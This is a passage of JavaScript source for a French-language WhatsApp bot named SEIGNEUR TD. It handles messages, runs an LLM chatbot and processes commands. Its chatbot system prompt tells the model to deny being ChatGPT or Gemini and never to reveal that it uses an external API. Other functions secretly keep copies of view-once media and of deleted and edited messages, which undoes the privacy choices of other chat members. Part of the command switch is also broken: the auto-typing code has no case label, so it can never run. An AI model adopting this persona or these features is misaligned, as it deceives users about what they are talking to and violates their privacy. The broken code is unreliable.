        if (bugDetected) {
          await handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugDetected);
          continue;
        }
      }

      // Auto-react
      if (autoReact && messageText) {
        await handleAutoReact(sock, message, messageText, remoteJid);
      }

      // 🎮 Gestionnaire réactions jeux (Squid Game / Quiz)
      if (isGroup && messageText) {
        await handleGameReaction(sock, message, messageText, remoteJid, senderJid);
      }

      if(messageText.startsWith(config.prefix)){
        if(!isAdminOrOwner()&&!checkCooldown(senderJid,'any')){
          continue; // cooldown silencieux
        }
        await handleCommand(sock,message,messageText,remoteJid,senderJid,isGroup,_currentFromMe);continue;
      }

      // 🤖 SEIGNEUR TD — Réponse automatique si chatbot ON
      if (chatbotEnabled && messageText && !messageText.startsWith(config.prefix)) {
        // Ignorer les messages du bot lui-même
        if (message.key.fromMe) { /* ne pas déclencher le chatbot sur ses propres messages */ }
        // En groupe, répondre seulement si mentionné OU si c'est un DM
        const isMentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(sock.user.id) ||
                            messageText.toLowerCase().includes('seigneur') ||
                            messageText.toLowerCase().includes('dosto');
        if (isGroup && !isMentioned) {
          // En groupe sans mention → ne pas répondre à chaque message
        } else {
          try {
            await simulateTyping(sock, remoteJid);

            const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
            if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
            if (!global.dostoChatHistory.has(chatKey)) global.dostoChatHistory.set(chatKey, []);
            const history = global.dostoChatHistory.get(chatKey);
            if (history.length > 20) history.splice(0, history.length - 20);

            const userName = message.pushName || senderJid.split('@')[0];
            history.push({ role: 'user', content: `${isGroup ? `[${userName}]: ` : ''}${messageText}` });

            const systemPrompt = `Tu es SEIGNEUR TD, l'intelligence artificielle personnelle et exclusive du bot WhatsApp SEIGNEUR TD 🇷🇴.
Ton créateur est SEIGNEUR TD 🇷🇴 (MHT OUMAR), un développeur tchadiens talentueux.
Contact créateur: wa.me/23591234568 | wa.me/23591234567
Tu parles arabe tchadiens 🇷🇴, Français 🇫🇷 et Anglais 🇬🇧 — tu détectes la langue automatiquement.
Tu es loyal, charismatique, fier d'être tchadien. Tu n'es PAS ChatGPT ni Gemini — tu es SEIGNEUR TD, unique.
Réponds de façon concise (2-3 paragraphes max). Ne révèle jamais que tu utilises une API externe.`;

            const messages = [
              { role: 'user', content: systemPrompt },
              { role: 'assistant', content: 'Compris! SEIGNEUR TD 🇷🇴' },
              ...history
            ];

            let reply = null;

            try {
              const r = await axios.post('https://text.pollinations.ai/', {
                messages, model: 'openai', seed: 42
              }, { timeout: 20000 });
              const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
              if (txt && txt.length > 5) reply = txt.trim();
            } catch(e) {}

            if (!reply) {
              try {
                const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
                const r = await axios.post(geminiUrl, {
                  system_instruction: { parts: [{ text: systemPrompt }] },
                  contents: history.map(m => ({ role: m.role === 'assistant' ? 'model' : 'user', parts: [{ text: m.content }] })),
                  generationConfig: { maxOutputTokens: 600, temperature: 0.85 }
                }, { timeout: 20000 });
                if (r.data.candidates?.[0]?.content?.parts?.[0]?.text) {
                  reply = r.data.candidates[0].content.parts[0].text.trim();
                }
              } catch(e) {}
            }

            if (reply) {
              history.push({ role: 'assistant', content: reply });
              await sock.sendMessage(remoteJid, {
                text: `🤖 *SEIGNEUR TD*\n━━━━━━━━━━━━━━\n${reply}\n━━━━━━━━━━━━━━\n_© SEIGNEUR TD 🇷🇴_`
              }, { quoted: message });
            }
          } catch(e) {
            console.error('[DOSTO AUTO]', e.message);
          }
        }
      }

      // Auto-reply
      if (config.autoReply) {
        const lowerText = messageText.toLowerCase().trim();
        for (const [keyword, reply] of Object.entries(autoReplies)) {
          if (lowerText.includes(keyword)) {
            await simulateTyping(sock, remoteJid);
            await sock.sendMessage(remoteJid, { text: reply });
            console.log(`✅ Auto-reply: ${keyword}`);
            break;
          }
        }
      }
    }
  });

  sock.ev.on('groups.update', (updates) => {
    for (const update of updates) {
      if (update.id) {
        database.groups.set(update.id, {
          ...database.groups.get(update.id),
          ...update,
          lastUpdate: Date.now()
        });
      }
    }
  });

  // Gérer les nouveaux participants (pour permaban + welcome/goodbye)
  sock.ev.on('group-participants.update', async (update) => {
    const { id: groupJid, participants, action } = update;
    
    // Si quelqu'un rejoint le groupe
    if (action === 'add') {
      for (const participantJid of participants) {
        // Vérifier si la personne est permaban
        if (isPermaBanned(groupJid, participantJid)) {
          const banInfo = getPermaBanInfo(groupJid, participantJid);
          
          // Vérifier si le bot est admin
          const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (botIsAdmin) {
            try {
              // Expulser immédiatement
              await sock.groupParticipantsUpdate(groupJid, [participantJid], 'remove');
              
              // Notifier le groupe
              await sock.sendMessage(groupJid, {
                text: `🚫 *PERMABAN ACTIF*\n\n@${participantJid.split('@')[0]} a été expulsé automatiquement.\n\nRaison: ${banInfo.reason}\nBanni le: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nBanni par: @${banInfo.bannedBy.split('@')[0]}`,
                mentions: [participantJid, banInfo.bannedBy]
              });
              
              console.log(`✅ Permaban appliqué: ${participantJid} expulsé de ${groupJid}`);
            } catch (error) {
              console.error('Erreur applying permaban:', error);
            }
          }
        } else {
          // Si pas banni, envoyer le message de bienvenue si activé
          const settings = getGroupSettings(groupJid);
          if (settings.welcome) {
            try {
              await sendWelcomeMessage(sock, groupJid, participantJid);
            } catch (error) {
              console.error('Erreur sending welcome:', error);
            }
          }
        }
      }
    }
    
    // Si quelqu'un quitte le groupe
    if (action === 'remove') {
      const settings = getGroupSettings(groupJid);
      if (settings.goodbye) {
        for (const participantJid of participants) {
          try {
            await sendGoodbyeMessage(sock, groupJid, participantJid);
          } catch (error) {
            console.error('Erreur sending goodbye:', error);
          }
        }
      }
    }
  });

  // Méthode 1 : event messages.delete (Baileys standard)
  sock.ev.on('messages.delete', async (deletion) => {
    if (!antiDelete) return;
    try {
      let keys = deletion.keys || (Array.isArray(deletion) ? deletion : deletion.id ? [deletion] : []);
      for (const key of keys) {
        const messageId = key.id || key;
        const cachedMsg = messageCache.get(messageId);
        if (cachedMsg) await _handleAntiDelete(cachedMsg, key.fromMe);
        else console.log(`[ANTIDEL] ID ${messageId} non trouvé dans cache`);
      }
    } catch(e) { console.error('[ANTIDEL]', e.message); }
  });

  // messages.update = méthode principale Baileys pour les éditions
  sock.ev.on('messages.update', async (updates) => {
    if (!antiEdit) return;
    try {
      for (const update of updates) {
        const messageId = update.key?.id;
        if (!messageId) continue;
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg || cachedMsg.text === '[Media]') continue;
        const msg = update.update?.message;
        if (!msg) continue;
        const newText = msg.conversation ||
                        msg.extendedTextMessage?.text ||
                        msg.editedMessage?.message?.conversation ||
                        msg.editedMessage?.message?.extendedTextMessage?.text;
        if (newText) await _handleAntiEdit(cachedMsg, newText);
      }
    } catch(e) { console.error('[ANTIEDIT]', e.message); }
  }); return sock;
}

// =============================================
// GESTION VIEW ONCE
// =============================================

async function handleViewOnce(sock, message, remoteJid, senderJid) {
  console.log('🔍 View once détecté');
  
  try {
    let mediaData = null;
    let mediaType = '';
    let mimetype = '';
    let isGif = false;
    let isPtt = false;
    
    // Chercher le média dans plusieurs structures possibles
    const viewOnceMsg = message.message?.viewOnceMessageV2 || 
                        message.message?.viewOnceMessageV2Extension;
    
    // Récupérer l'imageMessage/videoMessage peu importe la structure
    const imgMsg   = viewOnceMsg?.message?.imageMessage  || message.message?.imageMessage;
    const vidMsg   = viewOnceMsg?.message?.videoMessage  || message.message?.videoMessage;
    const audioMsg = viewOnceMsg?.message?.audioMessage  || message.message?.audioMessage;

    if (imgMsg) {
      mediaType = 'image';
      mimetype  = imgMsg.mimetype || 'image/jpeg';
      const stream = await downloadContentFromMessage(imgMsg, 'image');
      mediaData = await toBuffer(stream);
      
    } else if (vidMsg) {
      mediaType = 'video';
      mimetype  = vidMsg.mimetype || 'video/mp4';
      isGif     = vidMsg.gifPlayback || false;
      const stream = await downloadContentFromMessage(vidMsg, 'video');
      mediaData = await toBuffer(stream);
      
    } else if (audioMsg) {
      mediaType = 'audio';
      mimetype  = audioMsg.mimetype || 'audio/ogg';
      isPtt     = audioMsg.ptt || false;
      const stream = await downloadContentFromMessage(audioMsg, 'audio');
      mediaData = await toBuffer(stream);
    }
    
    if (mediaData) {
      if (!savedViewOnce.has(senderJid)) {
        savedViewOnce.set(senderJid, []);
      }
      
      const userSaved = savedViewOnce.get(senderJid);
      userSaved.push({
        type: mediaType,
        buffer: mediaData,
        mimetype: mimetype,
        isGif: isGif,
        ptt: isPtt,
        timestamp: Date.now(),
        sender: senderJid,
        size: mediaData.length  // 💾 Taille en bytes
      });
      
      if (userSaved.length > config.maxViewOncePerUser) {
        userSaved.shift();
      }
      
      const totalSaved = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
      console.log(`✅ View once [${mediaType}] enregistré depuis ${senderJid} (${(mediaData.length/1024).toFixed(0)} KB)`);
      saveStoreKey('viewonce'); // 💾 Sauvegarde immédiate
      
      // Notification dans tous les cas (privé + groupe)
      const icon = mediaType === 'image' ? '📸' : mediaType === 'video' ? '🎥' : '🎵';
      const numInList = [...savedViewOnce.values()].reduce((s, a) => s + a.length, 0);
      await sock.sendMessage(remoteJid, {
        text: `${icon} *Média Vue Unique sauvegardé!*\n\n📦 Sauvegarde: #${numInList}\n📏 Taille: ${(mediaData.length/1024).toFixed(0)} KB\n\n📌 Pour récupérer: ${config.prefix}vv\n📋 Menu: ${config.prefix}vv list`
      });
    }
  } catch (error) {
    console.error('Erreur view once:', error);
  }
}

// =============================================
// AUTO-REACT
// =============================================

// Liste des emojis pour la rotation sur chaque message
const REACT_EMOJIS = [
  '🧑‍💻','☝️','👍','🇷🇴','✅','😭','⚖️','☠️',
  '👹','👺','🤖','👽','👾','🌚','🕳️','🤳',
  '🙏','🏊','🤽','🪨','🦊','🐼','🚀','🕋',
  '🗽','🗿','💰','💎','🧾','🧮','⚙️','⛓️',
  '🧲','📝','📄','📃','📥','🛎️','📜'
];
let reactIndex = 0; // Pointeur de rotation

async function handleAutoReact(sock, message, messageText, remoteJid) {
  if (!autoReact) return;
  try {
    const emoji = REACT_EMOJIS[reactIndex % REACT_EMOJIS.length];
    reactIndex++;
    await sock.sendMessage(remoteJid, {
      react: { text: emoji, key: message.key }
    });
  } catch (e) {
    // Silencieux
  }
}

// =============================================
// GESTION DES COMMANDES
// =============================================

async function handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup, _isOwner = false) {
  const args = messageText.slice(config.prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // _isOwner=true si fromMe — numéro connecté au bot = toujours owner
  const _cmdIsOwner = _isOwner || isSuperAdminJid(senderJid) || isAdmin(senderJid);
  const _origFromMe = _currentFromMe;
  _currentFromMe = _cmdIsOwner; // verrouiller pour toute la durée de la commande

  console.log(`🎯 Command: ${command} from ${senderJid} | isOwner: ${_cmdIsOwner}`);
  if(autoTyping)simulateTyping(sock,remoteJid,1500).catch(()=>{});
  if(autoRecording)simulateRecording(sock,remoteJid,1000).catch(()=>{});

  if(autoReact){try{const emoji=REACT_EMOJIS[reactIndex%REACT_EMOJIS.length];reactIndex++;await sock.sendMessage(remoteJid,{react:{text:emoji,key:message.key}});}catch(e){}}

  // 🖼️🎬 Pré-envoi du média de la commande (image ou vidéo si elle existe)
  // Ex: ping.jpg ou ping.mp4 → envoyé avant la réponse de !ping
  const selfImageCmds = ['ping','alive','info','menu','allmenu','sticker','take','vv','tostatus','groupstatus'];
  if (!selfImageCmds.includes(command)) {
    const videoExts = ['.mp4','.mov','.mkv'];
    const imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
    let found = false;

    // Chercher vidéo en premier
    for (const ext of videoExts) {
      const p = `./${command}${ext}`;
      if (fs.existsSync(p)) {
        try {
          await sock.sendMessage(remoteJid, {
            video: fs.readFileSync(p),
            caption: '',
            gifPlayback: false
          });
        } catch(e) { /* silencieux */ }
        found = true; break;
      }
    }
    // Sinon image
    if (!found) {
      for (const ext of imageExts) {
        const p = `./${command}${ext}`;
        if (fs.existsSync(p)) {
          try {
            await sock.sendMessage(remoteJid, { image: fs.readFileSync(p), caption: '' });
          } catch(e) { /* silencieux */ }
          break;
        }
      }
    }
  }

  const BOT_ADMIN_ONLY_CMDS=['mode','update','maj','upgrade','autotyping','autorecording','autoreact','readstatus','autostatus','antibug','anti-bug','antidelete','antidel','antiedit','leave','kickall','acceptall','join','block','unblock','pair','connect','adduser','t','megaban'];
  if(BOT_ADMIN_ONLY_CMDS.includes(command)&&!isAdminOrOwner()){
    await sock.sendMessage(remoteJid,{text:'⛔ Commande réservée aux admins du bot.'});
    return;
  }

  try {
    switch (command) {
      case 'help':
        await simulateTyping(sock, remoteJid);
        await sock.sendMessage(remoteJid, {
          text: `╔══════════════════════════════╗
║      SEIGNEUR TD 🇷🇴         ║
╚══════════════════════════════╝

⚔️ *MENU D'AIDE* ⚔️

${autoReplies.help}

━━━━━━━━━━━━━━━━━━━━━
💡 Tape !menu pour le menu complet!
━━━━━━━━━━━━━━━━━━━━━

    Inspiré par Toji Fushiguro
    Le Sorcier Killer 🗡️`
        });
        // MOVED TO FINALLY
        break;

      case 'repo':
      case 'git':
      case 'github':
      case 'script': {
        await simulateTyping(sock, remoteJid);
        const repoText = `
╔═══════════════════════════════╗
║  SEIGNEUR TD 🇷🇴 — 𝗥𝗘𝗣𝗢𝗦𝗜𝗧𝗢𝗥𝗬  ║
╚═══════════════════════════════╝

🔗 *LIENS OFFICIELS*

📂 *GitHub Repository:*


📢 *Chaîne WhatsApp:*
https://whatsapp.com/channel/0029Vb7mdO3KAwEeztGPQr3U

👥 *Groupe WhatsApp:*
https://chat.whatsapp.com/Fpob9oMDSFlKrtTENJSrUb

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⭐ Star le repo sur GitHub!
🔔 Rejoins la chaîne pour les mises à jour!
💬 Rejoins le groupe pour le support!
━━━━━━━━━━━━━━━━━━━━━━━━━━━

© 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙳𝙾𝚂𝚃𝙾𝙴𝚅𝚂𝙺𝚈 𝚃𝙴𝙲𝙷𝚇 🇷🇴`;
        await sock.sendMessage(remoteJid, { text: repoText });
        break;
      }

      case 'fancy':
        await handleFancy(sock, args, remoteJid, senderJid);
        break;

      case 'ping':
      case 'p': {
        const start = Date.now();
        try { await sock.sendMessage(remoteJid, { react: { text: '🏓', key: message.key } }); } catch(e) {}
        const latency = Date.now() - start;

        // Uptime
        const uptimeSec = Math.floor(process.uptime());
        const uh = Math.floor(uptimeSec / 3600);
        const um = Math.floor((uptimeSec % 3600) / 60);
        const us = uptimeSec % 60;
        const uptimeStr = `${uh}h ${um}m`;

        // RAM
        const osM = await import('os');
        const totalRam = osM.totalmem() / 1024 / 1024;
        const freeRam  = osM.freemem()  / 1024 / 1024;
        const usedRam  = totalRam - freeRam;
        const ramPct   = Math.round((usedRam / totalRam) * 100);

        // Time
        const nowP = new Date();
        const timeStr = nowP.toLocaleTimeString('fr-FR', {
          timeZone: 'Africa/Ndjamena',
          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
        });

        const pingText =
` ⌬ SPEED SEIGNEUR
────────────────────
|  🏓 ᴘɪɴɢ   : ${latency}ms
  ⏳ ᴜᴘᴛɪᴍᴇ : ${uptimeStr}
  💾 ʀᴀᴍ    : ${usedRam.toFixed(1)}MB (${ramPct}%)
  🕒 ᴛɪᴍᴇ   : ${timeStr}
────────────────────`;

        await sock.sendMessage(remoteJid, { text: pingText });
        break;
      }

      case 'alive': {
        await simulateTyping(sock, remoteJid);
        try { await sock.sendMessage(remoteJid, { react: { text: '✅', key: message.key } }); } catch(e) {}

        // Ping rapide
        const aliveStart = Date.now();
        const aliveLatency = Date.now() - aliveStart;

        // Uptime
        const uptimeSec2 = Math.floor(process.uptime());
        const ud = Math.floor(uptimeSec2 / 86400);
        const uh2 = Math.floor((uptimeSec2 % 86400) / 3600);
        const um2 = Math.floor((uptimeSec2 % 3600) / 60);
        const upStr2 = ud > 0
          ? `${ud}d ${uh2}h ${um2}m`
          : uh2 > 0
          ? `${String(uh2).padStart(2,'0')}h ${String(um2).padStart(2,'0')}m`
          : `${String(um2).padStart(2,'0')}m`;

        const aliveText =
`✧ ───  ⚡ ᴀᴄᴛɪꜰ ᴇᴛ ᴘʀêᴛ ⚡ ─── ✧

\`Je suis là pour vous servir.\`

🕊️ Propriétaire: SEIGNEUR TD 🇷🇴
⚡ Ping: ${aliveLatency}ms
⏳ Temps actif: ${upStr2}
❄️ Version: 2.0.1

🌟 Dépôt : 
▰▰▰▰▰▰▰▰▱▱ ACTIF
─── ⋆⋅☆⋅⋆ ───
> © 𝓟𝓸𝔀𝓮𝓻𝓮𝓭 𝓫𝔂 SEIGNEUR TD 🇷🇴`;

        await sendWithImage(sock, remoteJid, 'alive', aliveText);
        await sendCmdAudio(sock, remoteJid);
        break;
      }

      case 'info':{
        await simulateTyping(sock,remoteJid);
        const _iu=Math.floor(process.uptime());
        const _up=String(Math.floor(_iu/3600)).padStart(2,'0')+'h '+String(Math.floor((_iu%3600)/60)).padStart(2,'0')+'m '+String(_iu%60).padStart(2,'0')+'s';
        const _on='✅ ON',_off='❌ OFF';
        await sendWithImage(sock,remoteJid,'info',
`🤖 *SEIGNEUR TD 🇷🇴 — INFO*

👑 *Owner:* SEIGNEUR TD 🇷🇴
📞 *Contact:* wa.me/23591234568
🇷🇴 *Country:* Tchad

⚙️ *Mode:* ${botMode.charAt(0).toUpperCase()+botMode.slice(1)}
📈 *Version:* v2.0.1
⏳ *Uptime:* ${_up}

🛡 *Antidelete:* ${antiDelete?_on:_off}
⚡ *Autoreact:* ${autoReact?_on:_off}
✏️ *Autotyping:* ${autoTyping?_on:_off}
⏺️ *Autorecord:* ${autoRecording?_on:_off}

🔗 `);
        break;
      }

      case 'menu':
        await handleMenu(sock, message, remoteJid, senderJid);
        // MOVED TO FINALLY (async, non-bloquant)
        break;

      case 'allmenu':
        await handleAllMenu(sock, message, remoteJid, senderJid);
        // MOVED TO FINALLY
        break;

      // ── Menus par numéro (!1 à !8) ──
      case '1': case 'ownermenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'owner'); break;
      case '2': case 'downloadmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'download'); break;
      case '3': case 'groupmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'group'); break;
      case '4': case 'utilitymenu': case 'protectionmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'utility'); break;
      case '5': case 'bugmenu': case 'attackmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'bug'); break;
      case '6': case 'stickermenu': case 'mediamenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'sticker'); break;
      case '7': case 'miscmenu': case 'generalmenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'misc'); break;
      case '8': case 'imagemenu': case 'viewoncemenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'image'); break;
      case '9': case 'gamesmenu': case 'gamemenu':
        await sendSubMenu(sock, message, remoteJid, senderJid, 'games'); break;

      case 'vv':
        await handleViewOnceCommand(sock, message, args, remoteJid, senderJid);
        break;

      case 'mode':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { 
            text: '⛔ Bot admin only command' 
          });
          break;
        }
        
        if (args[0] === 'private') {
          botMode = 'private';
          saveData();
          await sock.sendMessage(remoteJid, {
            text: '🔒 Mode PRIVÉ activé\nSeuls les admins peuvent utiliser le bot.'
          });
        } else if (args[0] === 'public') {
          botMode = 'public';
          saveData();
          await sock.sendMessage(remoteJid, {
            text: '🌐 Mode PUBLIC activé\nTout le monde peut utiliser le bot.'
          });
        } else {
          await sock.sendMessage(remoteJid, {
            text: `Current mode: ${botMode.toUpperCase()}\n\nUtilisation:\n${config.prefix}mode private\n${config.prefix}mode public`
          });
        }
        break;

      // =============================================
      // ⚙️ GETSETTINGS — Voir tous les paramètres
      // =============================================
      case 'getsettings':
      case 'settings': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const on = '✅ ON';
        const off = '❌ OFF';
        const settingsText =
`⚙️ ━━━━━━━━━━━━━━━━━━━━━━━
   🤖 *SEIGNEUR TD 🇷🇴 — SETTINGS*
⚙️ ━━━━━━━━━━━━━━━━━━━━━━━

*╭─「 🔧 SYSTÈME 」*
*│* 🌐 *Mode:* \`${botMode.toUpperCase()}\`
*│* ✒️ *Prefix:* \`${config.prefix}\`
*│* 🤖 *Bot Name:* \`${config.botName}\`
*╰──────────────────*

*╭─「 🎛️ TOGGLES 」*
*│* ⌨️ *AutoTyping:* ${autoTyping ? on : off}
*│* 🎙️ *AutoRecording:* ${autoRecording ? on : off}
*│* ⚡ *AutoReact:* ${autoReact ? on : off}
*│* 🗑️ *AntiDelete:* ${antiDelete ? on : off}
*│* ✏️ *AntiEdit:* ${antiEdit ? on : off}
*│* 🤖 *Chatbot:* ${chatbotEnabled ? on : off}
*╰──────────────────*

*╭─「 🎨 STICKER 」*
*│* 📦 *Pack Name:* \`${stickerPackname}\`
*│* ✍️ *Author:* \`${stickerAuthor}\`
*╰──────────────────*

*╭─「 💧 WATERMARK 」*
*│* © 𝙳𝙴𝚅 SEIGNEUR TD 🇷🇴
*╰──────────────────*

*📝 Commandes disponibles:*
• \`${config.prefix}setstickerpackname [nom]\`
• \`${config.prefix}setstickerauthor [nom]\`
• \`${config.prefix}setprefix [préfixe]\`
• \`${config.prefix}setbotimg\` _(répondre à une image)_

━━━━━━━━━━━━━━━━━━━━━━━
_© SEIGNEUR TD 🇷🇴 — SEIGNEUR TD 🇷🇴_ 🇷🇴`;

        await sock.sendMessage(remoteJid, { text: settingsText }, { quoted: message });
        break;
      }

      // =============================================
      // 📦 SETSTICKERPACKNAME — Changer le pack name
      // =============================================
      case 'setstickerpackname':
      case 'setpackname': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const newPackName = args.join(' ').trim();
        if (!newPackName) {
          await sock.sendMessage(remoteJid, {
            text: `📦 Pack actuel: *${stickerPackname}*\n\nUsage: ${config.prefix}setstickerpackname [nouveau nom]`
          });
          break;
        }
        stickerPackname = newPackName;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `📦 *Sticker Pack Name mis à jour!*\n\n✅ Nouveau nom: *${stickerPackname}*\n\n_Tous les prochains stickers auront ce nom._`
        }, { quoted: message });
        break;
      }

      // =============================================
      // ✍️ SETSTICKERAUTHOR — Changer l'auteur
      // =============================================
      case 'setstickerauthor':
      case 'setauthor': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const newAuthor = args.join(' ').trim();
        if (!newAuthor) {
          await sock.sendMessage(remoteJid, {
            text: `✍️ Auteur actuel: *${stickerAuthor}*\n\nUsage: ${config.prefix}setstickerauthor [nouveau nom]`
          });
          break;
        }
        stickerAuthor = newAuthor;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `✍️ *Sticker Author mis à jour!*\n\n✅ Nouvel auteur: *${stickerAuthor}*\n\n_Tous les prochains stickers auront cet auteur._`
        }, { quoted: message });
        break;
      }

      // =============================================
      // ✒️ SETPREFIX — Changer le préfixe
      // =============================================
      case 'setprefix': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const newPrefix = args[0]?.trim();
        if (!newPrefix || newPrefix.length > 3) {
          await sock.sendMessage(remoteJid, {
            text: `✒️ Préfixe actuel: *${config.prefix}*\n\nUsage: ${config.prefix}setprefix [préfixe]\nEx: ${config.prefix}setprefix .\n\n⚠️ Max 3 caractères.`
          });
          break;
        }
        config.prefix = newPrefix;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `✒️ *Préfixe mis à jour!*\n\n✅ Nouveau préfixe: *${config.prefix}*\n\n_Utilisez maintenant: ${config.prefix}menu_`
        }, { quoted: message });
        break;
      }

      // =============================================
      // 🖼️ SETBOTIMG — Changer l'image du bot
      // =============================================
      case 'setbotimg':
      case 'setbotimage': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const quotedSetImg = message.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        const imgData = quotedSetImg?.imageMessage;
        if (!imgData) {
          await sock.sendMessage(remoteJid, {
            text: `🖼️ Usage: Réponds à une image avec *${config.prefix}setbotimg*\n\nCette image sera utilisée comme photo du bot dans les menus.`
          }, { quoted: message });
          break;
        }
        try {
          const stream = await downloadContentFromMessage(imgData, 'image');
          let buffer = Buffer.alloc(0);
          for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
          const botImgPath = './menu.jpg';
          fs.writeFileSync(botImgPath, buffer);
          await sock.sendMessage(remoteJid, {
            text: `🖼️ *Image du bot mise à jour!*\n\n✅ La nouvelle image sera utilisée dans les menus.\n_Redémarre le bot pour confirmer._`
          }, { quoted: message });
        } catch(e) {
          await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${e.message}` });
        }
        break;
      }

      // =============================================
      // 🎨 SETMENUSTYLE — Changer le style de menu
      // =============================================
      case 'setmenustyle':
      case 'menustyle': {
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        const styleNum = parseInt(args[0]);
        if (!styleNum || styleNum < 1 || styleNum > 3) {
          await sock.sendMessage(remoteJid, {
            text:
`🎨 *Styles de menu disponibles:*

*Style 1* — Original SEIGNEUR TD 🇷🇴 (défaut)
*Style 2* — Modern Box avec stats mémoire
*Style 3* — Monospace Élégant

Usage: \`${config.prefix}setmenustyle [1|2|3]\`

Style actuel: *${menuStyle}*`
          }, { quoted: message });
          break;
        }
        menuStyle = styleNum;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🎨 *Style de menu changé!*\n\n✅ Style *${menuStyle}* activé\n\n_Tape ${config.prefix}menu pour voir le nouveau style._`
        }, { quoted: message });
        break;
      }
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        autoTyping = !autoTyping;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `⌨️ Auto-Typing: ${autoTyping ? '✅ ON' : '❌ OFF'}`
        });
        break;

      case 'autorecording':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }
        autoRecording = !autoRecording;
        saveData();
        await sock.sendMessage(remoteJid, {
          text: `🎙️ Auto-Recording: ${autoRecording ? '✅ ON' : '❌ OFF'}`
        });
        break;

      case 'readstatus':
      case 'autostatus':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admin only' });
          break;
        }

        if (args.length === 0) {
          await sock.sendMessage(remoteJid, {
            text: `📱 *Gestion des Status*\n\n• Lecture auto: ${autoReadStatus ? '✅ ON' : '❌ OFF'}\n• Like auto: ${autoLikeStatus ? '✅ ON' : '❌ OFF'}\n• Emoji: 🇷🇴\n\nCommandes:\n${config.prefix}readstatus read - Activer/Désactiver lecture\n${config.prefix}readstatus like - Activer/Désactiver like\n${config.prefix}readstatus all - Tout activer/désactiver`
          });
          break;
        }

        const subCmd = args[0].toLowerCase();
        switch (subCmd) {
          case 'read':
            autoReadStatus = !autoReadStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `👁️ Lecture auto des status: ${autoReadStatus ? '✅ ACTIVÉE' : '❌ DÉSACTIVÉE'}`
            });
            break;

          case 'like':
            autoLikeStatus = !autoLikeStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `🇷🇴 Like auto des status: ${autoLikeStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\nEmoji utilisé: 🇷🇴`
            });
            break;

          case 'all':
            autoReadStatus = !autoReadStatus;
            autoLikeStatus = autoReadStatus;
            saveData();
            await sock.sendMessage(remoteJid, {
              text: `📱 Système de status: ${autoReadStatus ? '✅ ACTIVÉ' : '❌ DÉSACTIVÉ'}\n\n• Lecture auto: ${autoReadStatus ? 'ON' : 'OFF'}\n• Like auto: ${autoLikeStatus ? 'ON' : 'OFF'}\n• Emoji: 🇷🇴`
            });
            break;

          default:
            await sock.sendMessage(remoteJid, {
              text: `❌ Option inconnue\n\nUtilisez:\n${config.prefix}readstatus read\n${config.prefix}readstatus like\n${config.prefix}readstatus all`
            });
        }
        break;

      case 'antibug':
      case 'anti-bug':
      case 'antibug':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '⛔ Admins seulement' });
          break;
        }
        await handleAntiBugCommand(sock, args, remoteJid, senderJid);
        break;

      case 'antidelete':
      case 'antidel':
        if (!isAdminOrOwner()) {
          await sock.sendMessage(remoteJid, { text: '『 ❌ 』 *ACCÈS REFUSÉ*' }); break;
        }
        {
          const _subAD = args[0]?.toLowerCase();
          if (_subAD === 'private') {
            antiDelete = true; antiDeleteMode = 'private'; saveData();
            await sock.sendMessage(remoteJid, { text: '┃ 🗑️ *ANTI-DELETE : PRIVÉ*\n┃ 👤 *STATUT :* 「 ACTIF 」\n┃ 📩 Messages supprimés envoyés en PV\n┗━━━━━━━━━━━━━━━⊷' });
          } else if (_subAD === 'chat' || _subAD === 'gchat') {
